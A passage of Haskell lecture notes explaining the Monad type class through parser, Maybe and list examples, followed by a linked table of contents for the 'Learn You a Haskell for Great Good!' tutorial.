parseFoo :: Parser Foo
parseFoo = Bar <$> parseInt <*> parseInt <*> parseChar
~~~~

assuming we have functions `parseInt :: Parser Int` and `parseChar ::
Parser Char`.  The `Applicative` instance automatically handles the
possible failure (if parsing any of the components fail, parsing the
entire `Foo` will fail) and threading through the unconsumed portion
of the `String` input to each component in turn.

However, suppose we are trying to parse a file containing a sequence
of numbers, like this:

    4 78 19 3 44 3 1 7 5 2 3 2

The catch is that the first number in the file tells us the length of
a following "group" of numbers; the next number after the group is the
length of the next group, and so on.  So the example above could be
broken up into groups like this:

    78 19 3 44   -- first group
    1 7 5        -- second group
    3 2          -- third group

This is a somewhat contrived example, but in fact there are many
"real-world" file formats that follow a similar principle---you read
some sort of header which then tells you the lengths of some following
blocks, or where to find things in the file, and so on.

We would like to write a parser for this file format of type

~~~~ {.haskell}
parseFile :: Parser [[Int]]
~~~~

Unfortunately, this is not possible using only the `Applicative`
interface.  The problem is that `Applicative` gives us no way to
decide what to do next based on previous results: we must decide in
advance what parsing operations we are going to run, before we see the
results.

It turns out, however, that the `Parser` type *can* support this sort
of pattern, which is abstracted into the `Monad` type class.

Monad
-----

The `Monad` type class is defined as follows: 

~~~~ {.haskell}
class Monad m where
  return :: a -> m a

  (>>=) :: m a -> (a -> m b) -> m b

  (>>)  :: m a -> m b -> m b
  m1 >> m2 = m1 >>= \_ -> m2
~~~~

This should look familiar!  We have seen these methods before in the
context of `IO`, but in fact they are not specific to `IO` at all.
It's just that a monadic interface to `IO` has proved useful.

`return` also looks familiar because it has the same type as `pure`.
In fact, every `Monad` should also be an `Applicative`, with `pure =
return`.  The reason we have both is that `Applicative` was invented
*after* `Monad` had already been around for a while.

`(>>)` is just a specialized version of `(>>=)` (it is included in
the `Monad` class in case some instance wants to provide a more
efficient implementation, but usually the default implementation
is just fine).  So to understand it we first need to understand `(>>=)`.

There is actually a fourth method called `fail`, but putting it in the
`Monad` class was a mistake, and you should never use it, so I won't
tell you about it (you can
[read about it in the Typeclassopedia](http://www.haskell.org/haskellwiki/Typeclassopedia#do_notation)
if you are interested).

`(>>=)` (pronounced "bind") is where all the action is!  Let's think
carefully about its type:

    (>>=) :: m a -> (a -> m b) -> m b

`(>>=)` takes two arguments.  The first one is a value of type `m a`.
(Incidentally, such values are sometimes called *monadic values*, or
*computations*.  It has also been proposed to call them *mobits*.  The
one thing you must *not* call them is "monads", since that is a kind
error: the type constructor `m` is a monad.) In any case, the idea is
that a mobit of type `m a` represents a computation which results in a
value (or several values, or no values) of type `a`, and may also have
some sort of "effect":

  * `c1 :: Maybe a` is a computation which might fail but results in an `a` if
    it succeeds.

  * `c2 :: [a]` is a computation which results in (multiple) `a`s.

  * `c3 :: Parser a` is a computation which implicitly consumes part
    of a `String` and (possibly) produces an `a`.

  * `c4 :: IO a` is a computation which potentially has some I/O effects and
    then produces an `a`.

And so on.  Now, what about the second argument to `(>>=)`?  It is a
*function* of type `(a -> m b)`.  That is, it is a function which will
*choose* the next computation to run based on the result(s) of the
first computation.  This is precisely what embodies the promised power
of `Monad` to encapsulate computations which can choose what to do
next based on the results of previous computations.

So all `(>>=)` really does is put together two mobits to produce a
larger one, which first runs one and then the other, returning the
result of the second one.  The all-important twist is that we get to
decide which mobit to run second based on the output from the first.

The default implementation of `(>>)` should make sense now:

    (>>)  :: m a -> m b -> m b
    m1 >> m2 = m1 >>= \_ -> m2

`m1 >> m2` simply does `m1` and then `m2`, ignoring the result of
`m1`.

Examples
--------

Let's start by writing a `Monad` instance for `Maybe`: 

~~~~ {.haskell}
instance Monad Maybe where
  return  = Just
  Nothing >>= _ = Nothing
  Just x  >>= k = k x
~~~~

`return`, of course, is `Just`.  If the first argument of `(>>=)` is
`Nothing`, then the whole computation fails; otherwise, if it is `Just
x`, we apply the second argument to `x` to decide what to do next.

Incidentally, it is common to use the letter `k` for the second
argument of `(>>=)` because `k` stands for "continuation".  I wish I
was joking.

Some examples:

> check :: Int -> Maybe Int
> check n | n < 10    = Just n
>         | otherwise = Nothing
>
> halve :: Int -> Maybe Int
> halve n | even n    = Just $ n `div` 2
>         | otherwise = Nothing
>
> exM1 = return 7 >>= check >>= halve
> exM2 = return 12 >>= check >>= halve
> exM3 = return 12 >>= halve >>= check

How about a `Monad` instance for the list constructor `[]`?

~~~~ {.haskell}
instance Monad [] where
  return x = [x]
  xs >>= k = concat (map k xs)
~~~~

A simple example:

> addOneOrTwo :: Int -> [Int]
> addOneOrTwo x = [x+1, x+2]
>
> exL1 = [10,20,30] >>= addOneOrTwo

Monad combinators
-----------------

One nice thing about the `Monad` class is that using only `return` and
`(>>=)` we can build up a lot of nice general combinators for
programming with monads. Let's look at a couple.

First, `sequence` takes a list of monadic values and produces a single
monadic value which collects the results.  What this means depends on
the particular monad.  For example, in the case of `Maybe` it means
that the entire computation succeeds only if all the individual ones
do; in the case of `IO` it means to run all the computations in
sequence; in the case of `Parser` it means to run all the parsers on
sequential parts of the input (and succeed only if they all do).

~~~~ {.haskell}
sequence :: Monad m => [m a] -> m [a]
sequence [] = return []
sequence (ma:mas) =
  ma >>= \a ->
  sequence mas >>= \as ->
  return (a:as)
~~~~

Using `sequence` we can also write other combinators, such as

~~~~ {.haskell}
replicateM :: Monad m => Int -> m a -> m [a]
replicateM n m = sequence (replicate n m)
~~~~

And now we are finally in a position to write the parser we wanted to
write: it is simply

~~~~ {.haskell}
parseFile :: Parser [[Int]]
parseFile = many parseLine
parseLine :: Parser [Int]
parseLine = parseInt >>= \i -> replicateM i parseInt
~~~~

(`many` was also known as `zeroOrMore` on the homework).

 <!--

Local Variables: 
mode:markdown
compile-command:"make explec"
End:

-->






=====================================
/Learn You a Haskell for Great Good!
=====================================


.. rubric:: Learn You a Haskell for Great Good!
   :name: learn-you-a-haskell-for-great-good

#. `Introduction <http://learnyouahaskell.com/introduction>`__

   -  `About this tutorial <http://learnyouahaskell.com/introduction#about-this-tutorial>`__
   -  `So what's Haskell? <http://learnyouahaskell.com/introduction#so-whats-haskell>`__
   -  `What you need to dive in <http://learnyouahaskell.com/introduction#what-you-need>`__

#. `Starting Out <http://learnyouahaskell.com/starting-out>`__

   -  `Ready, set, go! <http://learnyouahaskell.com/starting-out#ready-set-go>`__
   -  `Baby's first functions <http://learnyouahaskell.com/starting-out#babys-first-functions>`__
   -  `An intro to lists <http://learnyouahaskell.com/starting-out#an-intro-to-lists>`__
   -  `Texas ranges <http://learnyouahaskell.com/starting-out#texas-ranges>`__
   -  `I'm a list comprehension <http://learnyouahaskell.com/starting-out#im-a-list-comprehension>`__
   -  `Tuples <http://learnyouahaskell.com/starting-out#tuples>`__

#. `Types and Typeclasses <http://learnyouahaskell.com/types-and-typeclasses>`__

   -  `Believe the type <http://learnyouahaskell.com/types-and-typeclasses#believe-the-type>`__
   -  `Type variables <http://learnyouahaskell.com/types-and-typeclasses#type-variables>`__
   -  `Typeclasses 101 <http://learnyouahaskell.com/types-and-typeclasses#typeclasses-101>`__

#. `Syntax in Functions <http://learnyouahaskell.com/syntax-in-functions>`__

   -  `Pattern matching <http://learnyouahaskell.com/syntax-in-functions#pattern-matching>`__
   -  `Guards, guards! <http://learnyouahaskell.com/syntax-in-functions#guards-guards>`__
   -  `Where!? <http://learnyouahaskell.com/syntax-in-functions#where>`__ -  `Let it be <http://learnyouahaskell.com/syntax-in-functions#let-it-be>`__
   -  `Case expressions <http://learnyouahaskell.com/syntax-in-functions#case-expressions>`__

#. `Recursion <http://learnyouahaskell.com/recursion>`__

   -  `Hello recursion! <http://learnyouahaskell.com/recursion#hello-recursion>`__
   -  `Maximum awesome <http://learnyouahaskell.com/recursion#maximum-awesome>`__
   -  `A few more recursive functions <http://learnyouahaskell.com/recursion#a-few-more-recursive-functions>`__
   -  `Quick, sort! <http://learnyouahaskell.com/recursion#quick-sort>`__
   -  `Thinking recursively <http://learnyouahaskell.com/recursion#thinking-recursively>`__

#. `Higher Order Functions <http://learnyouahaskell.com/higher-order-functions>`__

   -  `Curried functions <http://learnyouahaskell.com/higher-order-functions#curried-functions>`__
   -  `Some higher-orderism is in order <http://learnyouahaskell.com/higher-order-functions#higher-orderism>`__
   -  `Maps and filters <http://learnyouahaskell.com/higher-order-functions#maps-and-filters>`__
   -  `Lambdas <http://learnyouahaskell.com/higher-order-functions#lambdas>`__
   -  `Only folds and horses <http://learnyouahaskell.com/higher-order-functions#folds>`__
   -  `Function application with $ <http://learnyouahaskell.com/higher-order-functions#function-application>`__
   -  `Function composition <http://learnyouahaskell.com/higher-order-functions#composition>`__

#. `Modules <http://learnyouahaskell.com/modules>`__

   -  `Loading modules <http://learnyouahaskell.com/modules#loading-modules>`__
   -  `Data.List <http://learnyouahaskell.com/modules#data-list>`__
   -  `Data.Char <http://learnyouahaskell.com/modules#data-char>`__
   -  `Data.Map <http://learnyouahaskell.com/modules#data-map>`__
   -  `Data.Set <http://learnyouahaskell.com/modules#data-set>`__
   -  `Making our own modules <http://learnyouahaskell.com/modules#making-our-own-modules>`__

#. `Making Our Own Types and Typeclasses <http://learnyouahaskell.com/making-our-own-types-and-typeclasses>`__

   -  `Algebraic data types intro <http://learnyouahaskell.com/making-our-own-types-and-typeclasses#algebraic-data-types>`__
   -  `Record syntax <http://learnyouahaskell.com/making-our-own-types-and-typeclasses#record-syntax>`__
   -  `Type parameters <http://learnyouahaskell.com/making-our-own-types-and-typeclasses#type-parameters>`__
   -  `Derived instances <http://learnyouahaskell.com/making-our-own-types-and-typeclasses#derived-instances>`__
   -  `Type synonyms <http://learnyouahaskell.com/making-our-own-types-and-typeclasses#type-synonyms>`__
   -  `Recursive data structures <http://learnyouahaskell.com/making-our-own-types-and-typeclasses#recursive-data-structures>`__
   -  `Typeclasses 102 <http://learnyouahaskell.com/making-our-own-types-and-typeclasses#typeclasses-102>`__
   -  `A yes-no typeclass <http://learnyouahaskell.com/making-our-own-types-and-typeclasses#a-yes-no-typeclass>`__
   -  `The Functor typeclass <http://learnyouahaskell.com/making-our-own-types-and-typeclasses#the-functor-typeclass>`__
   -  `Kinds and some type-foo <http://learnyouahaskell.com/making-our-own-types-and-typeclasses#kinds-and-some-type-foo>`__

#. `Input and Output <http://learnyouahaskell.com/input-and-output>`__

   -  `Hello, world! <http://learnyouahaskell.com/input-and-output#hello-world>`__
   -  `Files and streams <http://learnyouahaskell.com/input-and-output#files-and-streams>`__
   -  `Command line arguments <http://learnyouahaskell.com/input-and-output#command-line-arguments>`__
   -  `Randomness <http://learnyouahaskell.com/input-and-output#randomness>`__
   -  `Bytestrings <http://learnyouahaskell.com/input-and-output#bytestrings>`__
   -  `Exceptions <http://learnyouahaskell.com/input-and-output#exceptions>`__

#. `Functionally Solving Problems <http://learnyouahaskell.com/functionally-solving-problems>`__

   -  `Reverse Polish notation calculator <http://learnyouahaskell.com/functionally-solving-problems#reverse-polish-notation-calculator>`__
   -  `Heathrow to London <http://learnyouahaskell.com/functionally-solving-problems#heathrow-to-london>`__

#. `Functors, Applicative Functors and Monoids <http://learnyouahaskell.com/functors-applicative-functors-and-monoids>`__

   -  `Functors redux <http://learnyouahaskell.com/functors-applicative-functors-and-monoids#functors-redux>`__
   -  `Applicative functors <http://learnyouahaskell.com/functors-applicative-functors-and-monoids#applicative-functors>`__
   -  `The newtype keyword <http://learnyouahaskell.com/functors-applicative-functors-and-monoids#the-newtype-keyword>`__
   -  `Monoids <http://learnyouahaskell.com/functors-applicative-functors-and-monoids#monoids>`__
#. `A Fistful of Monads <http://learnyouahaskell.com/a-fistful-of-monads>`__

   -  `Getting our feet wet with Maybe <http://learnyouahaskell.com/a-fistful-of-monads#getting-our-feet-wet-with-maybe>`__
   -  `The Monad type class <http://learnyouahaskell.com/a-fistful-of-monads#the-monad-type-class>`__
   -  `Walk the line <http://learnyouahaskell.com/a-fistful-of-monads#walk-the-line>`__
   -  `do notation <http://learnyouahaskell.com/a-fistful-of-monads#do-notation>`__
   -  `The list monad <http://learnyouahaskell.com/a-fistful-of-monads#the-list-monad>`__
   -  `Monad laws <http://learnyouahaskell.com/a-fistful-of-monads#monad-laws>`__

#. `For a Few Monads More <http://learnyouahaskell.com/for-a-few-monads-more>`__

   -  `Writer? I hardly know her! <http://learnyouahaskell.com/for-a-few-monads-more#writer>`__
   -  `Reader? Ugh, not this joke again. <http://learnyouahaskell.com/for-a-few-monads-more#reader>`__
   -  `Tasteful stateful computations <http://learnyouahaskell.com/for-a-few-monads-more#state>`__
   -  `Error error on the wall <http://learnyouahaskell.com/for-a-few-monads-more#error>`__
   -  `Some useful monadic functions <http://learnyouahaskell.com/for-a-few-monads-more#useful-monadic-functions>`__
   -  `Making monads <http://learnyouahaskell.com/for-a-few-monads-more#making-monads>`__

#. `Zippers <http://learnyouahaskell.com/zippers>`__

   -  `Taking a walk <http://learnyouahaskell.com/zippers#taking-a-walk>`__
   -  `A trail of breadcrumbs <http://learnyouahaskell.com/zippers#a-trail-of-breadcrumbs>`__
   -  `Focusing on lists <http://learnyouahaskell.com/zippers#focusing-on-lists>`__
   -  `A very simple file system <http://learnyouahaskell.com/zippers#a-very-simple-file-system>`__
   -  `Watch your step <http://learnyouahaskell.com/zippers#watch-your-step>`__

This work is licensed under a 
`Creative Commons Attribution-Noncommercial-Share Alike 3.0 Unported License <http://creativecommons.org/licenses/by-nc-sa/3.0/>`__
because I couldn't find a license with an even longer name.



